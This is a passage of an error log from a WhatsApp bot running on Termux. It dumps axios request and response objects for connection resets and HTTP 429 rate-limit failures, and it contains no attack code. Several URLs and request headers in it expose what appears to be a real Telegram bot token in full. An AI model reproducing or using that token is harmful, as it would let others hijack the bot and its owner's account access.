    data: '{"query":"tambahkan document untuk code dibawah\\nexports.run = {\\nusage: [\'resend\'],\\nuse: \'reply media + text\',\\ncategory: \'tools\',\\nasync: async (m, { func, mecha, quoted }) => {\\nif (!m.quoted) return m.reply(\'Reply image/video with caption.\')\\nif (/video|image/i.test(quoted.mime)) {\\nlet media = await m.quoted.download()\\nlet caption = m.text ? m.text : \'\'\\nmecha.sendMedia(m.chat, media, null, { caption: caption, expiration: m.expiration })\\n} else m.reply(`Reply image/video dengan caption ${m.cmd}`)\\n},\\nlimit: true\\n}","prompt":"Saya adalah Bot Omnipresent, Bot WhatsApp dengan program kecerdasan buatan AI, saya di ciptakan oleh SuryaDev dan Ras."}'
  },
  request: <ref *1> Writable {
    _events: {
      close: undefined,
      error: [Function: handleRequestError],
      prefinish: undefined,
      finish: undefined,
      drain: undefined,
      response: [Function: handleResponse],
      socket: [Function: handleRequestSocket]
    },
    _writableState: WritableState {
      highWaterMark: 65536,
      length: 0,
      corked: 0,
      onwrite: [Function: bound onwrite],
      writelen: 0,
      bufferedIndex: 0,
      pendingcb: 0,
      [Symbol(kState)]: 17580812,
      [Symbol(kBufferedValue)]: null
    },
    _maxListeners: undefined,
    _options: {
      maxRedirects: 21,
      maxBodyLength: Infinity,
      protocol: 'https:',
      path: '/api/ai/gpt4',
      method: 'POST',
      headers: [Object: null prototype],
      agents: [Object],
      auth: undefined,
      family: undefined,
      beforeRedirect: [Function: dispatchBeforeRedirect],
      beforeRedirects: [Object],
      hostname: 'api.yanzbotz.my.id',
      port: '',
      agent: undefined,
      nativeProtocols: [Object],
      pathname: '/api/ai/gpt4'
    },
    _ended: true,
    _ending: true,
    _redirectCount: 0,
    _redirects: [],
    _requestBodyLength: 661,
    _requestBodyBuffers: [],
    _eventsCount: 3,
    _onNativeResponse: [Function (anonymous)],
    _currentRequest: ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: false,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: true,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: '661',
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'POST /api/ai/gpt4 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'Content-Type: application/json\r\n' +
        'User-Agent: axios/1.7.3\r\n' +
        'Content-Length: 661\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: api.yanzbotz.my.id\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'POST',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/api/ai/gpt4',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'api.yanzbotz.my.id',
      protocol: 'https:',
      _redirectable: [Circular *1],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    _currentUrl: 'https://api.yanzbotz.my.id/api/ai/gpt4',
    [Symbol(shapeMode)]: true,
    [Symbol(kCapture)]: false
  },
  cause: Error: read ECONNABORTED
      at TLSWrap.onStreamRead (node:internal/stream_base_commons:218:20) {
    errno: -103,
    code: 'ECONNABORTED',
    syscall: 'read'
  }
}
[02/08/24 19:43:53] - Error: write ECONNABORTED
    at WriteWrap.onWriteComplete [as oncomplete] (node:internal/stream_base_commons:95:16)
    at handleWriteReq (node:internal/stream_base_commons:52:26)
    at writeGeneric (node:internal/stream_base_commons:150:15)
    at Socket._writeGeneric (node:net:954:11)
    at Socket._write (node:net:966:8)
    at writeOrBuffer (node:internal/streams/writable:570:12)
    at _write (node:internal/streams/writable:499:10)
    at Writable.write (node:internal/streams/writable:508:10)
    at Sender.sendFrame (/data/data/com.termux/files/home/.BOTTT/node_modules/ws/lib/sender.js:565:20)
    at Sender.dispatch (/data/data/com.termux/files/home/.BOTTT/node_modules/ws/lib/sender.js:500:12) {
  errno: -103,
  code: 'ECONNABORTED',
  syscall: 'write'
}
[02/08/24 20:25:13] - AxiosError: read ECONNRESET
    at AxiosError.from (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:873:14)
    at RedirectableRequest.handleRequestError (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:3152:25)
    at RedirectableRequest.emit (node:events:520:28)
    at eventHandlers.<computed> (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:38:24)
    at ClientRequest.emit (node:events:520:28)
    at TLSSocket.socketErrorListener (node:_http_client:502:9)
    at TLSSocket.emit (node:events:520:28)
    at emitErrorNT (node:internal/streams/destroy:170:8)
    at emitErrorCloseNT (node:internal/streams/destroy:129:3)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
    at Axios.request (/data/data/com.termux/files/home/.BOTTT/node_modules/axios/dist/node/axios.cjs:4262:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async telesticker (/data/data/com.termux/files/home/.BOTTT/plugins/convert/telesticker.js:33:13)
    at async Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/convert/telesticker.js:13:1)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382) {
  syscall: 'read',
  code: 'ECONNRESET',
  errno: -104,
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.3',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    method: 'get',
    url: 'https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=Saint_Cecilia_and_Pastor_Lawrence_P4',
    data: undefined
  },
  request: <ref *1> Writable {
    _events: {
      close: undefined,
      error: [Function: handleRequestError],
      prefinish: undefined,
      finish: undefined,
      drain: undefined,
      response: [Function: handleResponse],
      socket: [Function: handleRequestSocket]
    },
    _writableState: WritableState {
      highWaterMark: 65536,
      length: 0,
      corked: 0,
      onwrite: [Function: bound onwrite],
      writelen: 0,
      bufferedIndex: 0,
      pendingcb: 0,
      [Symbol(kState)]: 17580812,
      [Symbol(kBufferedValue)]: null
    },
    _maxListeners: undefined,
    _options: {
      maxRedirects: 21,
      maxBodyLength: Infinity,
      protocol: 'https:',
      path: '/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=Saint_Cecilia_and_Pastor_Lawrence_P4',
      method: 'GET',
      headers: [Object: null prototype],
      agents: [Object],
      auth: undefined,
      family: undefined,
      beforeRedirect: [Function: dispatchBeforeRedirect],
      beforeRedirects: [Object],
      hostname: 'api.telegram.org',
      port: '',
      agent: undefined,
      nativeProtocols: [Object],
      pathname: '/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet',
      search: '?name=Saint_Cecilia_and_Pastor_Lawrence_P4'
    },
    _ended: true,
    _ending: true,
    _redirectCount: 0,
    _redirects: [],
    _requestBodyLength: 0,
    _requestBodyBuffers: [],
    _eventsCount: 3,
    _onNativeResponse: [Function (anonymous)],
    _currentRequest: ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=Saint_Cecilia_and_Pastor_Lawrence_P4 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.3\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: api.telegram.org\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=Saint_Cecilia_and_Pastor_Lawrence_P4',
      _ended: false,
      res: null,
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'api.telegram.org',
      protocol: 'https:',
      _redirectable: [Circular *1],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    _currentUrl: 'https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=Saint_Cecilia_and_Pastor_Lawrence_P4',
    [Symbol(shapeMode)]: true,
    [Symbol(kCapture)]: false
  },
  cause: Error: read ECONNRESET
      at TLSWrap.onStreamRead (node:internal/stream_base_commons:218:20) {
    errno: -104,
    code: 'ECONNRESET',
    syscall: 'read'
  }
}
[03/08/24 14:02:06] - AxiosError: Request failed with status code 429
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:547:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient [as onIncoming] (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:26:1) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.3',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://cdn.filestackcontent.com/FzTg0fEaTLSPnWaM7bKC',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /FzTg0fEaTLSPnWaM7bKC HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.3\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: cdn.filestackcontent.com\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/FzTg0fEaTLSPnWaM7bKC',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: false,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://cdn.filestackcontent.com/FzTg0fEaTLSPnWaM7bKC',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 40,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: HTTPParser {
      '0': null,
      '1': [Function: parserOnHeaders],
      '2': [Function: parserOnHeadersComplete],
      '3': [Function: parserOnBody],
      '4': [Function: parserOnMessageComplete],
      '5': null,
      '6': null,
      _headers: [],
      _url: '',
      socket: [TLSSocket],
      incoming: [IncomingMessage],
      outgoing: [Circular *1],
      maxHeaderPairs: 2000,
      _consumed: false,
      onIncoming: [Function: parserOnIncomingClient],
      joinDuplicateHeaders: undefined,
      [Symbol(resource_symbol)]: [HTTPClientAsyncResource]
    },
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'cdn.filestackcontent.com',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://cdn.filestackcontent.com/FzTg0fEaTLSPnWaM7bKC',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'cdn.filestackcontent.com',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 11,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'cdn.filestackcontent.com',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: [HTTPParser],
      _httpMessage: [Circular *1],
      autoSelectFamilyAttemptedAddresses: [Array],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 1162737,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 7298877,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 1162739,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 429,
    statusText: 'Too Many Requests',
    headers: Object [AxiosHeaders] {
      connection: 'keep-alive',
      'content-length': '50',
      'content-type': 'text/plain; charset=utf-8',
      'access-control-allow-headers': 'Content-Type, X-No-Stream',
      'access-control-allow-methods': 'DELETE, GET, HEAD, POST, PUT',
      'access-control-allow-origin': '*',
      'access-control-max-age': '21600',
      'cache-control': 'private',
      'filestack-trace-id': '1722668526-qsyGoiO6Sk',
      'x-content-type-options': 'nosniff',
      via: '1.1 varnish, 1.1 varnish',
      'accept-ranges': 'bytes',
      age: '0',
      date: 'Sat, 03 Aug 2024 07:02:06 GMT',
      'x-served-by': 'cache-iad-kcgs7200067-IAD, cache-kul9823-KUL',
      'x-cache': 'MISS, MISS',
      'x-cache-hits': '0, 0',
      'x-timer': 'S1722668526.964985,VS0,VE247',
      vary: 'Fastly-Fs-Security',
      'content-security-policy': "default-src 'self'; font-src 'self'; img-src 'self'; script-src 'self'; style-src 'unsafe-inline';"
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://cdn.filestackcontent.com/FzTg0fEaTLSPnWaM7bKC',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /FzTg0fEaTLSPnWaM7bKC HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.3\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: cdn.filestackcontent.com\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/FzTg0fEaTLSPnWaM7bKC',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: [HTTPParser],
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'cdn.filestackcontent.com',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: false,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://cdn.filestackcontent.com/FzTg0fEaTLSPnWaM7bKC',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 40,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[03/08/24 19:43:49] - AxiosError: Request failed with status code 429
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:547:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient [as onIncoming] (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33)
    at async Object.main (/data/data/com.termux/files/home/.BOTTT/plugins/event/_response.js:32:1) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.3',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://cdn.filestackcontent.com/NdoLW6RfSZpDjmAc08xA',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /NdoLW6RfSZpDjmAc08xA HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.3\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: cdn.filestackcontent.com\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
